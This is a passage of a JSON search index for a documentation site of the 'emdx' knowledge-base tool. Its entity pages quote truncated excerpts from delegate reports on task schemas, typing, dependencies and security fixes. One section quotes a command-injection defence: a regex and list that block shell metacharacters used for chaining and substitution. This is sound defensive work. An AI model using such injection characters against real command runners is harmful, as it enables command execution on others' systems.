\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/project/","title":"project","text":"<p>Type: tech_term | Mentioned in: 14 documents | First seen: 2026-02-13</p>"},{"location":"entities/project/#documents-14","title":"Documents (14)","text":"<ul> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: 1. Created <code>emdx/ui/types.py</code></p> <p>...<code>created_at</code>, <code>doc_count</code>, <code>total_cost_usd</code>, <code>total_tokens</code>, <code>child_group_count</code>, <code>project</code>, <code>parent_group_id</code>, <code>is_active</code>.</p> </li> <li> <p>#6501 None Type Analysis [6/7]   Section: 1. hybrid_search.py</p> </li> </ul> <pre><code>@dataclass\nclass HybridSearchResult:\n    project: str | None  # Line 40\n</code></pre> <ul> <li> <p>NECESSARY \u2705 \u2014 Documents may not have a project assigned; represents optional project association</p> </li> <li> <p>#6502 None Type Analysis [1/7]   Section: emdx/commands/core.py</p> <p>...ata` (lines 55-62)</p> </li> </ul> <pre><code>@dataclass\nclass DocumentMetadata:\n    title: str\n    project: str | None = None\n    tags: list[str] | None = None\n</code></pre> <p>Verdict: NECESSARY - <code>project</code>: May not be detectable (not in git repo). - <code>tags</code>: Optional, only set if...</p> <ul> <li>#6497 None Type Analysis [6/7]   Section: UNNECESSARY <code>| None</code> Annotations </li> </ul> <pre><code>project: str | None\n</code></pre> <p>Reason: Necessary \u2014 projects can legitimately be <code>None</code> for unorganized documents.</p> <ul> <li> <p>#6484 Any Type Removal Analysis [4/5]   Section: File: <code>emdx/services/ask_service.py</code></p> <p>Why: SQL params can only be strings or integers in this context (LIKE pattern strings and project names).</p> </li> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Tasks Table (Core Entity)</p> <p>...est) | | <code>gameplan_id</code> | INTEGER | NULL | FK to documents (optional gameplan) | | <code>project</code> | TEXT | NULL | Project name filter | | <code>current_step</code> | TEXT | NULL | Current step for resumption | | Timestamps | | <code>created_at</code> | TIMESTAMP | now | Creation...</p> </li> <li> <p>#6410 Delegate: Research and design structured metadata for emdx save and de [2/2]   Section: Current State Analysis</p> <p>Existing document fields:</p> </li> <li><code>id</code>, <code>title</code>, <code>content</code>, <code>project</code> (core data)</li> <li><code>created_at</code>, <code>updated_at</code>, <code>accessed_at</code>, <code>access_count</code> (timestamps/tracking)</li> <li><code>is_deleted</code>, <code>deleted_at</code> (soft delete)</li> <li> <p><code>parent_id</code>, `relationshi...</p> </li> <li> <p>#6219 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: Medium Severity Issues (17)</p> <p>...ue: Document dicts lack structured types. Fields like <code>id</code>, <code>title</code>, <code>content</code>, <code>project</code>, <code>tags</code> should be defined in TypedDict Severity:** MEDIUM (5 instances)</p> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Database Schema</p> <p>...failed</p> </li> <li><code>priority</code>: 1-5 (default 3)</li> <li><code>gameplan_id</code>: Links to documents table</li> <li><code>project</code>: Project name</li> <li><code>current_step</code>: Resume checkpoint</li> <li> <p><code>created_at</code>, <code>updated_at</code>, <code>completed_at</code>: Timestamps</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Task Fields</p> <p>...meplan_id<code>| INTEGER | NULL | FK to documents (optional gameplan association) | |</code>project<code>| TEXT | NULL | Project name filter | |</code>current_step<code>| TEXT | NULL | Current step within task | |</code>created_at<code>| TIMESTAMP | now | Creation time | |</code>updated_at`...</p> </li> <li> <p>#6161 Delegate: Analyze task usage in prime and status commands. Read emdx/c [7/15]   Section: The Task Table Has Dual Purposes</p> <ol> <li>Manual to-do tracking: <code>title</code>, <code>description</code>, <code>priority</code>, <code>gameplan_id</code>, <code>project</code>, <code>depends_on</code></li> </ol> </li> <li> <p>Delegate activity logging: <code>prompt</code>, <code>type</code> (single/group/chain), <code>execution_id</code>, <code>output_doc_id</code>, <code>source_doc_id</code>, <code>parent_task_id</code>, <code>seq</code>, `r...</p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Overlap Between Delegate's Task Tracking and Task System</p> <p>...e_doc_id` \u2014 input document</p> </li> <li><code>tags</code>, <code>prompt</code>, <code>type</code> \u2014 metadata</li> <li> <p><code>gameplan_id</code>, <code>project</code> \u2014 organization</p> </li> <li> <p>#6154 Delegate: analysis [3/3]   Section: Overview</p> <p>EMDX is a sophisticated command-line knowledge base and documentation management system built in Python (3.11+). It provides full-text search, tagging, project organization, and multiple interfaces for managing and accessing documentation.</p> </li> </ul>"},{"location":"entities/project/#line-40-project-str-none","title":"Line 40: <code>project: str | None</code>","text":""},{"location":"entities/project/#1-hybrid_searchpy40-hybridsearchresultproject","title":"1. <code>hybrid_search.py:40</code> \u2014 <code>HybridSearchResult.project</code>","text":""},{"location":"entities/project/#related-entities","title":"Related Entities","text":"<ul> <li><code>task_deps table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> <li><code>verdict: necessary (both)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>verdict: necessary (both param and return)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.9)</li> <li><code>depends_on</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.7)</li> <li><code>execution_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>dependency system</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>cycle detection</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>chain tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>created_at</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (8 shared docs, PMI=5.5)</li> <li><code>retry_of</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.4)</li> </ul>"},{"location":"entities/prompt/","title":"prompt","text":"<p>Type: tech_term | Mentioned in: 17 documents | First seen: 2026-01-15</p>"},{"location":"entities/prompt/#documents-17","title":"Documents (17)","text":"<ul> <li>#6542 Delegate Enhancement Gameplans [5/5]   Section: Architecture Decision <p>...us.py<code>already implements</code>_show_failed_tasks()` using this function</p> </li> <li>Tasks have <code>prompt</code> field which is needed for the retry command</li> <li> <p>Executions don't have error messages stored; errors live in log files</p> </li> <li> <p>#6502 None Type Analysis [1/7]   Section: emdx/commands/delegate.py</p> </li> </ul> <pre><code>def _load_doc_context(doc_id: int, prompt: str | None) -&gt; str:\n</code></pre> <p>Verdict: NECESSARY - <code>prompt</code>: Checked with <code>if prompt:</code> \u2014 generates different output with/without prompt.</p> <ul> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: System Components</p> <p>...\u2502 \u2502  \u2502 task_runner.py   \u2502        \u2502 prime.py (context)   \u2502           \u2502 \u2502  \u2502 - prompt build   \u2502        \u2502 status.py (monitor)  \u2502           \u2502 \u2502  \u2502 - Claude exec    \u2502        \u2502                      \u2502           \u2502 \u2502  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518        \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500...</p> </li> <li> <p>#6216 Delegate: Audit MIGRATION/SCHEMA DEBT in the emdx project: Check datab [6/14]   Section: MEDIUM Severity</p> </li> <li> <p>#6192 Delegate: Investigate the activity browser behavior when showing deleg [1/3]   Section: delegate.py - Execution Creation Flow</p> <p>...209`):    ```python    task_id = _safe_create_task(        title=doc_title,        prompt=prompt[:500],        task_type=\"single\",        status=\"active\",        source_doc_id=source_doc_id,        parent_task_id=parent_task_id,        seq=seq,        tag...</p> </li> <li> <p>#6180 Delegate: Task System Comprehensive Analysis [15/15]   Section: Core Components</p> <p>...cked`</p> </li> <li>Priority levels 1-5 with gameplan linkage</li> <li> <p>Fields for delegate activity: <code>prompt</code>, <code>type</code>, <code>execution_id</code>, <code>output_doc_id</code>, <code>source_doc_id</code>, <code>seq</code>, <code>retry_of</code>, <code>tags</code></p> </li> <li> <p>#6172 Delegate: Analyze competing/overlapping concepts in emdx. The system h [8/15]   Section: Executive Summary</p> <p>...le with status, dependencies, gameplan_id)</p> </li> <li>Cascade (document stages: idea \u2192 prompt \u2192 analyzed \u2192 planned \u2192 done)</li> <li> <p>Delegate Executions (execution tracking + task records)</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: 3. Tasks Table (<code>models/tasks.py</code>)</p> <p>...|-------------| | <code>id</code> | INTEGER PK | Task ID | | <code>title</code> | TEXT | Task title | | <code>prompt</code> | TEXT | The prompt sent to Claude | | <code>type</code> | TEXT | single/group/chain | | <code>status</code> | TEXT | open/active/blocked/done/failed | | <code>execution_id</code> | INTEGER FK | Li...</p> </li> <li> <p>#6167 Delegate: Analyze how tasks appear in the TUI. Read emdx/ui/browser_co [6/15]   Section: What the TUI Actually Shows</p> <ol> <li>Cascade Browser (key <code>2</code>)</li> </ol> </li> <li>Shows documents flowing through cascade pipeline stages</li> <li> <p>Stages: idea \u2192 prompt \u2192 analyzed \u2192 planned \u2192 done</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Delegate Activity Tracking Fields (added in migration 034)</p> ...Field Type Default Description <code>prompt</code> TEXT NULL The prompt used for delegate execution <code>type</code> TEXT \"single\" Task type: single, parallel, chain, etc. <code>execution_id</code> INTEGER NULL ... </li> <li> <p>#6163 Delegate: Analyze the emdx task CLI commands. Read emdx/commands/tasks [2/15]   Section: Subcommand Analysis</p> <p>Implementation: \u2705 Complete. Confirmation prompt unless --force.</p> </li> <li> <p>#6161 Delegate: Analyze task usage in prime and status commands. Read emdx/c [7/15]   Section: The Task Table Has Dual Purposes</p> <p>...iority<code>,</code>gameplan_id<code>,</code>project<code>,</code>depends_on`</p> </li> <li> <p>Delegate activity logging: <code>prompt</code>, <code>type</code> (single/group/chain), <code>execution_id</code>, <code>output_doc_id</code>, <code>source_doc_id</code>, <code>parent_task_id</code>, <code>seq</code>, <code>retry_of</code></p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Task Creation in Delegate</p> </li> <li>Creates task BEFORE execution (lines 200-209):</li> <li><code>task_type=\"single\"</code>, <code>status=\"active\"</code></li> <li> <p>Stores <code>source_doc_id</code>, <code>parent_task_id</code>, <code>seq</code>, <code>tags</code>, <code>prompt</code></p> </li> <li> <p>#5183 Gameplan: Implement Task-Driven Workflows   Section: Gameplan: Implement Task-Driven Workflows</p> </li> <li> <p>#5182 Workflow Redesign: Task-Driven Execution   Section: Problem</p> <ul> <li><code>prompts[]</code> hardcoded in workflow JSON</li> </ul> </li> <li><code>runs</code> is a fixed count  </li> <li>Adding/removing tasks requires editing the workflow</li> <li>Each track needs its own prompt template (<code>{{track_1}}</code>, <code>{{track_2}}</code>, etc.)</li> </ul>"},{"location":"entities/prompt/#function-_load_doc_context-line-389","title":"Function: <code>_load_doc_context</code> (line 389)","text":""},{"location":"entities/prompt/#5-missing-index-tasksprompt-for-delegate-filtering","title":"5. Missing Index: tasks.prompt for Delegate Filtering","text":"<p>Location: <code>migrations.py:1804-1832</code> and <code>models/tasks.py:94-95, 176</code> Issue: Multiple queries filter on <code>prompt IS NULL</code> to exclude del...</p>"},{"location":"entities/prompt/#single-task-_run_single","title":"Single Task (<code>_run_single</code>)","text":""},{"location":"entities/prompt/#overview","title":"Overview","text":"<p>Refactor workflow system so tasks are runtime input, not hardcoded prompts.</p>"},{"location":"entities/prompt/#related-entities","title":"Related Entities","text":"<ul> <li><code>retry_of</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.6)</li> <li><code>tasks table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.6)</li> <li><code>depends_on</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=5.6)</li> <li><code>execution_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>dependency system</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>chain tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>task_deps table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>task runner</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>task lifecycle</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>single tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/pull-request/","title":"pull request","text":"<p>Type: heading | Mentioned in: 16 documents | First seen: 2025-07-08</p>"},{"location":"entities/pull-request/#documents-16","title":"Documents (16)","text":"<ul> <li>#6563 Delegate: Document #6418 (Type System Audit: Replace Any/None with Con <p>Updated <code>commands/analyze.py</code> (Audit items 47-55)</p> </li> </ul> <p>Functions updated with concrete return types: - <code>_collect_health_data()</code> \u2192 <code>HealthData</code> - <code>_collect_duplicates_data()</code> \u2192 <code>DuplicatesData</code> - <code>_collect_similar_data()</code> \u2192 <code>SimilarData</code> - `_collect_empty...</p> <ul> <li>#6560 Delegate: Recent Failures in emdx prime <p>JSON output (lines 622-647 in <code>_output_json()</code>):</p> </li> <li>Adds <code>recent_failures</code> array to output</li> <li>Each failure includes: id, title, completed_at, exit_code, task_id, error_snippet, retry_command</li> <li>Always included (not just verbose mode)</li> </ul>"},{"location":"entities/pull-request/#_1","title":"`...","text":"<ul> <li> <p>#6392 Delegate: Replace pickle with safe serialization in similarity cache.   Section: Changes Made</p> </li> <li> <p>#6272 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [36/37]</p> <p>Safe Execution Changed subprocess call to use <code>shell=False</code>:</p> </li> </ul> <pre><code>result = subprocess.run(args, shell=False, capture_output=True, ...)\n</code></pre>"},{"location":"entities/pull-request/#pull-request_1","title":"Pull Request","text":"<p>Created PR #592: https://github.com/arockwell/emdx/pull/592</p>"},{"location":"entities/pull-request/#test-coverage","title":"Test Coverage","text":"<p>Added 28 security tests in <code>TestValidateDiscoveryCommand</code>: - 8 tests for allowed comman...</p> <ul> <li>#6271 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [33/37] </li> </ul>"},{"location":"entities/pull-request/#migration-debt-fix-report","title":"Migration Debt Fix Report","text":""},{"location":"entities/pull-request/#task","title":"Task","text":"<p>Fix MIGRATION DEBT: Add ON DELETE CASCADE to foreign keys missing it (orphan data risk) and add a functional index on LOWER(title) for case-insensitive lookups. ## Analysis</p>"},{"location":"entities/pull-request/#foreign-keys-missing-on-delete-beha","title":"Foreign Keys Missing ON DELETE Beha...","text":"<ul> <li>#6268 Delegate: Document #6230 (Migration/Schema Debt Implementation) <p>Added Security Documentation (MEDIUM severity)</p> </li> </ul> <p>File: <code>emdx/database/groups.py</code></p> <p>Added security comment to <code>update_group()</code> explaining the allowlist pattern that prevents SQL injection when interpolating field names into SQL. ## Test Results</p> <p>All...</p> <ul> <li>#6267 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [32/37] <p>Metacharacter Blocking: Dangerous shell characters are rejected:</p> </li> <li> <p><code>;</code> <code>&amp;</code> <code>|</code> <code>`</code> <code>$</code> <code>&gt;</code> (command chaining/substitution)</p> </li> <li> <p>Safe Execution: Commands run with <code>shell=False</code> using <code>shlex.split()</code>:</p> </li> </ul> <pre><code># AFTER (secure)\nargs, _ =...\n\n- **#6265** Delegate: Document #6230 - Security Fix Implementation\n  *Section: Test Coverage*\n  &gt; ## Pull Request\n**URL:** https://github.com/arockwell/emdx/pull/508\n\n- **#6259** Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [17/37]\n  *Section: Changes Made*\n  &gt; ## Pull Request\nhttps://github.com/arockwell/emdx/pull/501\n\n- **#6255** Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [20/37]\n  &gt; **Added `_validate_discovery_command()` function**:\n   - Uses `shlex.split()` to safely parse commands\n   - Validates base command against allowlist\n   - Restricts git to safe subcommands only\n\n3. **Updated `_run_discovery()`**:\n   - Now calls valida...\n\n- **#6245** Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [2/37]\n  &gt; Shell Metacharacter Blocking\nRegex `[;&amp;|`$(){}[\\]&lt;&gt;\\!\\\n\n]` blocks injection attempts:\n- Command chaining: `;`, `&amp;&amp;`, `||`\n- Pipes: `|`\n- Command substitution: `` ` ``, `$()`\n- Redirects: `&lt;`, `&gt;`\n- Newlines: `\n`, `\n`\n\n### 3. Safe Execution\n- Uses `sh...\n\n- **#6241** Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [10/37]\n  &gt; **Added proper error handling:**\n   - Invalid command syntax (e.g., unclosed quotes)\n   - Empty commands\n   - Command not found\n   - Timeout handling\n\n## Testing\n\nAdded 12 comprehensive tests for `_run_discovery()`:\n- Basic functionality tests\n- Secu...\n\n- **#6213** Delegate: PR #452 Auto-Linking Depth Bug Fix\n  &gt; display logic ... if current_level &lt; depth:\n            child_links = linker.get_links(link.doc_id, limit=3)\n            # Filter out all visited ancestors to prevent cycles\n            child_links = [l for l in child_links if l.doc_id not in visited...\n\n- **#6138** Delegate: Read gameplan by running: emdx view 6099. Implement the Smar [3/7]\n  *Section: Smart Priming Feature Implementation Complete*\n  &gt; ### Pull Request\n- PR #446: https://github.com/arockwell/emdx/pull/446\n- Branch: feat/smart-priming\n\n- **#6357** Delegate: Investigate why the textual upgrade analysis delegate (doc #6353) didn't create a PR\n  *Section: Log Comparison*\n  &gt; ...h   # git push\n[13:22:50] \ud83d\udcbb Using tool: Bash   # gh pr create\n</code></pre> <p>Final result: \"Pull Request URL: https://github.com/arockwell/emdx/pull/568\"</p> <ul> <li>#289 README   Section: Contributing <p>Contributions are welcome! Please feel free to submit a Pull Request.</p> </li> </ul>"},{"location":"entities/pull-request/#related-entities","title":"Related Entities","text":"<ul> <li><code>pull request created</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.7)</li> <li><code>remaining audit items</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>safe execution</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>fix implementation</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.3)</li> <li><code>3. safe execution</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.0)</li> <li><code>vulnerability details</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=4.9)</li> <li><code>1. command allowlist</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=4.7)</li> <li><code>medium:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.7)</li> <li><code>low:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.7)</li> <li><code>code changes</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.7)</li> </ul>"},{"location":"entities/pyprojecttoml/","title":"pyproject.toml","text":"<p>Type: heading | Mentioned in: 20 documents | First seen: 2025-07-07</p>"},{"location":"entities/pyprojecttoml/#documents-20","title":"Documents (20)","text":"<ul> <li>#158 UV Packaging and Distribution Guide for Claude Knowledge   Section: UV Project Structure <p>```bash my-project/ \u251c\u2500\u2500 pyproject.toml      # Project metadata and dependencies \u251c\u2500\u2500 uv.lock            # Locked dependencies (like poetry.lock) \u251c\u2500\u2500 .python-version    # Python version for this project \u251c\u2500\u2500 src/ \u2502   \u2514\u2500\u2500 my_package/ \u2514\u2500\u2500 tests/</p> </li> </ul> <pre><code>\n- **#6848** Delegate: ARCH-14: Add click as an explicit dependency in pyproject.to [3/4]\n  *Section: Summary*\n  &gt; **Task:** ARCH-14 \u2014 Add click as an explicit dependency in pyproject.toml\n\n- **#6595** Delegate: Research what an 'emdx init' command should do for first-run [2/4]\n  *Section: Patterns from Other Tools*\n  &gt; ### 6. uv init (Modern Defaults)\n- Zero questions, creates minimal `pyproject.toml`\n- Auto-detects Python version\n- `--lib`, `--app`, `--script` for variations\n- **Key lesson:** Opinionated defaults beat questions\n\n- **#6591** Delegate: Research what an 'emdx init' command should do for first-run [2/4]\n  *Section: Analysis of Existing CLI Init Patterns*\n  &gt; ...ault (press Enter to accept)\n- `--no-interaction` flag for scripted use\n- Creates `pyproject.toml` only\n- **Takeaway**: Defaults should be good enough that Enter-through-wizard works\n\n- **#6423** Delegate: Research upgrading pytest from 7.x to 9.x, pytest-cov from 4 [1/5]\n  *Section: Required Migration Steps*\n  &gt; #### Step 1: Update pytest.ini_options\nAdd to `pyproject.toml`:\n```toml\n[tool.pytest.ini_options]\nasyncio_default_fixture_loop_scope = \"function\"\n</code></pre> <ul> <li> <p>#6420 Delegate: Research upgrading click from 8.1 to 8.3. Identify any break [5/5]   Section: Recommendation</p> <p>Update <code>pyproject.toml</code> constraint from <code>&gt;=8.1.0</code> to <code>&gt;=8.1.0,&lt;9.0.0</code> or simply let it resolve naturally.</p> </li> <li> <p>#6377 Codebase Bug Audit 2026-02-15 [5/10]   Section: Version Consistency Check</p> <p>\u2705 PASS - Versions are synchronized:</p> </li> <li><code>pyproject.toml</code>: <code>version = \"0.14.0\"</code></li> <li> <p><code>emdx/__init__.py</code>: <code>__version__ = \"0.14.0\"</code></p> </li> <li> <p>#6359 Delegate: DEBT-11: Add security scanning to the CI pipeline. Edit .git [3/3]   Section: Changes Made</p> <p>...- Uses Python 3.13 and Poetry (matching existing jobs)</p> </li> <li>Runs <code>bandit -r emdx/ -c pyproject.toml</code> for code security scanning</li> <li> <p>Runs <code>pip-audit --local</code> for dependency vulnerability scanning</p> </li> <li> <p>#6353 Delegate: Analyze upgrading textual from ^4.0.0 to ^6.2.1 for the emdx [2/2]   Section: 2.5 Tree-Sitter Requires Python 3.10+ (v6.0.0)</p> <p>Our <code>pyproject.toml</code> specifies <code>python = \"^3.11\"</code>, so this is not a concern.</p> </li> <li> <p>#6296 DEBT-28: O(n\u00b2) Duplicate Detection - Already Fixed   Section: Test Results</p> </li> <li><code>emdx/services/duplicate_detector.py</code> - Core implementation</li> <li><code>tests/test_duplicate_detector.py</code> - Comprehensive tests</li> <li> <p><code>pyproject.toml</code> - Optional <code>similarity</code> extra for datasketch</p> </li> <li> <p>#6288 Delegate: DEBT-13: Add retry logic for network/IO operations   Section: Changes Made</p> </li> <li> <p>Updated <code>pyproject.toml</code> to include <code>tenacity ^9.0.0</code> for robust retry functionality</p> </li> <li> <p>#6274 DEBT-3: Fix dependency debt - remove python-dotenv, update ruff, remove black   Section: Changes Made</p> </li> <li>Why: Declared in pyproject.toml but never imported anywhere in the codebase</li> <li> <p>Verification: Grep confirmed no imports of <code>dotenv</code>, <code>load_dotenv</code>, or <code>from dotenv</code> exist</p> </li> <li> <p>#6239 Dependency Debt Cleanup: Remove unused deps and update ruff   Section: Changes Made</p> </li> <li>python-dotenv - Declared in <code>pyproject.toml</code> but never imported anywhere in the codebase</li> <li> <p>black - Redundant since ruff handles both linting and formatting</p> </li> <li> <p>#6235 Delegate: tech-debt,audit,comprehensive [12/14]   Section: \ud83d\udd34 Critical Issues</p> <p>Recommended Fix:</p> </li> <li>Review pytest-cov configuration in <code>pyproject.toml</code></li> <li>Ensure tests import from <code>emdx.</code> package, not relative paths</li> <li> <p>Add coverage gates to CI/CD</p> </li> <li> <p>#6229 Delegate: Audit DEPENDENCY DEBT in the emdx project: Check pyproject.t [1/14]   Section: EMDX Dependency Debt Audit Report</p> </li> <li> <p>#6215 Delegate: Audit BUILD/CI DEBT in the emdx project: Check GitHub Action [7/14]   Section: \ud83d\udd34 HIGH SEVERITY</p> <p>...Issue: Only tests Python 3.13 despite claiming support for 3.11, 3.12, 3.13 in pyproject.toml</p> </li> </ul> <pre><code>matrix:\n  python-version: [\"3.13\"]  # Should be [\"3.11\", \"3.12\", \"3.13\"]\n</code></pre> <p>Risk: Breaking changes in 3.11/3.12 won't be caught</p> <ul> <li>#6183 Delegate: analysis,audit [13/17]   Section: \ud83d\udd34 Critical <ol> <li>Poetry Lock Stale</li> </ol> </li> <li><code>poetry.lock</code> out of sync with <code>pyproject.toml</code></li> <li> <p>Fix: Run <code>poetry lock</code></p> </li> <li> <p>#5039 Parallel Fix Track Results - LSH Duplicate Detection   Section: Track 1: LSH/MinHash Duplicate Detection Performance Fix</p> </li> <li><code>emdx/services/duplicate_detector.py</code> - 264 lines changed (+579/-38)</li> <li><code>pyproject.toml</code> - Added datasketch dependency</li> <li> <p><code>tests/test_duplicate_detector.py</code> - 352 lines (new test file)</p> </li> <li> <p>#1 SQLite Migration Plan for emdx   Section: 4. Migration Strategy</p> </li> <li><code>database.py</code> - Complete rewrite for SQLite</li> <li><code>pyproject.toml</code> - Remove psycopg dependency</li> <li><code>README.md</code> - Update installation (simpler!)</li> <li> <p>Add <code>migrate.py</code> - Optional migration tool</p> </li> <li> <p>#6458 Delegate: Say hello and list 3 files in the current directory. Be brie   Section: 3 Files in Current Directory</p> <ol> <li>README.md - Project documentation</li> </ol> </li> <li>pyproject.toml - Python project configuration</li> <li>justfile - Task runner commands</li> </ul>"},{"location":"entities/pyprojecttoml/#key-files","title":"Key Files","text":""},{"location":"entities/pyprojecttoml/#1-added-tenacity-dependency","title":"1. Added tenacity dependency","text":""},{"location":"entities/pyprojecttoml/#1-removed-python-dotenv","title":"1. Removed python-dotenv","text":""},{"location":"entities/pyprojecttoml/#removed-dependencies","title":"Removed Dependencies","text":""},{"location":"entities/pyprojecttoml/#summary","title":"Summary","text":"<p>Audited <code>pyproject.toml</code> for outdated dependencies, unused packages, version pinning issues, missing groups, and stdlib replacement opportunities.</p>"},{"location":"entities/pyprojecttoml/#files-modified","title":"Files Modified","text":""},{"location":"entities/pyprojecttoml/#files-to-modify","title":"Files to modify:","text":""},{"location":"entities/pyprojecttoml/#related-entities","title":"Related Entities","text":"<ul> <li><code>poetry.lock</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>^0.15.0</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>^0.1.0</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.4)</li> <li><code>sensitive hashing</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.4)</li> <li><code>research: emdx init command design</code> 